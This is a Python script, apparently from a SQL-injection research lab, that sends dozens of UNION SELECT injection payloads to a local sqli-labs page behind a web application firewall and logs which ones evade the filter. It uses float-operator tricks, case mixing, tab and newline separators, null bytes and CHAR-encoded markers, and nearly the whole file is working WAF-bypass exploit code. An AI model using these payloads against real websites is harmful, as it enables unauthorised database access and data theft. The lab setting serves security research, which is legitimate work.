"""
bypass_lab/test_plus_float.py
==============================
Key insight: '-1'.6e0 = SQL error (no operator)
             '-1'+.6e0 = valid MySQL ('-1' + 0.6 = -0.4, no match)

WAF passes the .6e0 variant. Adding + fixes SQL validity.
Does WAF still pass when SQL becomes valid?

Run:
    python3 -m bypass_lab.test_plus_float
"""
import sys, time
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
from seqsqli.core.response import classify_response
import requests

PLAIN = "http://localhost:8081/Less-1/"
WAF   = "http://localhost:8888/Less-1/"
M     = "'SEQSQLI_START','SEQSQLI_END'"
START_U = "CHAR(83,69,81,83,81,76,73,95,83,84,65,82,84 USING utf8)"
END_U   = "CHAR(83,69,81,83,81,76,73,95,69,78,68 USING utf8)"
FOUND = []


def t(label, payload):
    rp = requests.get(PLAIN, params={"id": payload}, timeout=8)
    rw = requests.get(WAF,   params={"id": payload}, timeout=8)

    plain_ok  = classify_response(rp.text, rp.status_code, "union",
                                  strict_markers=True) == "SUCCESS"
    plain_err = "syntax" in rp.text.lower() or "error" in rp.text.lower()
    waf_ok    = classify_response(rw.text, rw.status_code, "union",
                                  strict_markers=True) == "SUCCESS"
    waf_pass  = rw.status_code != 403

    p_tag = "OK" if plain_ok else ("ERR" if plain_err else "NODATA")
    w_tag = "*** BYPASS ***" if waf_ok else ("PASS(no_data)" if waf_pass else "BLOCK")

    print(f"  plain={p_tag:<8} waf={w_tag:<18} | {label}")
    if waf_ok:
        FOUND.append(("BYPASS", label, payload))
        print(f"    {payload[:100]}")
    elif waf_pass:
        FOUND.append(("PASS", label, payload))
    time.sleep(0.3)


print("=" * 65)
print(" +float operator fix: '-1'+.6e0 UNION SELECT ...")
print("=" * 65)

# ── 1. Baseline: float tanpa operator (invalid SQL) ───────────────────
print("\n[1] Baseline — dot float tanpa operator (ERR expected)")
t("no-op .6e0",      f"-1'.6e0 UNION SELECT database(),{M}-- -")
t("no-op .6e0+CHAR", f"-1'.6e0 UNION SELECT database(),{START_U},{END_U}-- -")

# ── 2. Plus operator + float (valid SQL) ─────────────────────────────
print("\n[2] +float — valid MySQL: '-1'+.6e0 = -0.4")
floats = [".6e0", ".6e1", ".1e0", ".0e0", "1e-1", ".9e-9",
          ".6E0", ".6e+0", "1.0e-9", ".123e2", ".001e3"]
for f in floats:
    t(f"'+{f}",    f"-1'+{f} UNION SELECT database(),{M}-- -")
    t(f"'+{f}+CH", f"-1'+{f} UNION SELECT database(),{START_U},{END_U}-- -")

# ── 3. Minus operator + float ────────────────────────────────────────
print("\n[3] -float")
for f in [".6e0", ".1e0", ".6E0", "1e-1"]:
    t(f"'-{f}",    f"-1'-{f} UNION SELECT database(),{M}-- -")
    t(f"'-{f}+CH", f"-1'-{f} UNION SELECT database(),{START_U},{END_U}-- -")

# ── 4. Multiply / divide ──────────────────────────────────────────────
print("\n[4] *.6e0 dan /.6e0")
for op in ["*", "/"]:
    t(f"'{op}.6e0",    f"-1'{op}.6e0 UNION SELECT database(),{M}-- -")
    t(f"'{op}.6e0+CH", f"-1'{op}.6e0 UNION SELECT database(),{START_U},{END_U}-- -")

# ── 5. Operator + case/whitespace combos ─────────────────────────────
print("\n[5] +.6e0 + case/whitespace combos")
t("+.6e0 + case",
  f"-1'+.6e0 uNiOn sElEcT database(),{START_U},{END_U}-- -")
t("+.6e0 + tab",
  f"-1'+.6e0\tUNION\tSELECT\tdatabase(),{START_U},{END_U}-- -")
t("+.6e0 + newline",
  f"-1'+.6e0\nUNION\nSELECT\ndatabase(),{START_U},{END_U}-- -")
t("+.6e0 + null_byte",
  f"-1'+.6e0 UNION SELECT database(),{START_U},{END_U};\x00")
t("+.6e0 + USING suffix",
  f"-1'+.6e0 UNION SELECT database() USING utf8,{START_U},{END_U}-- -")
t("+.6e0 + USING + case",
  f"-1'+.6e0 uNiOn sElEcT database() USING utf8,{START_U},{END_U}-- -")

# ── 6. Combine everything: +.6e0 + USING utf8 (invalid col) + CHAR markers
print("\n[6] Triple combo: +.6e0 + col USING utf8 + CHAR USING markers")
t("full triple combo",
  f"-1'+.6e0 UNION SELECT database() USING utf8,{START_U},{END_U}-- -")
t("full triple + case",
  f"-1'+.6e0 uNiOn sElEcT database() USING utf8,{START_U},{END_U}-- -")
t("full triple + newline",
  f"-1'+.6e0\nuNiOn\nsElEcT\ndatabase() USING utf8,{START_U},{END_U}-- -")

# ── Summary ───────────────────────────────────────────────────────────
print("\n" + "=" * 65)
bypasses = [x for x in FOUND if x[0] == "BYPASS"]
passes   = [x for x in FOUND if x[0] == "PASS"]
print(f" BYPASS: {len(bypasses)}  |  WAF_PASS (need SQL fix): {len(passes)}")
for tag, label, p in FOUND:
    print(f"\n  [{tag}] {label}")
    print(f"  {p[:110]}")
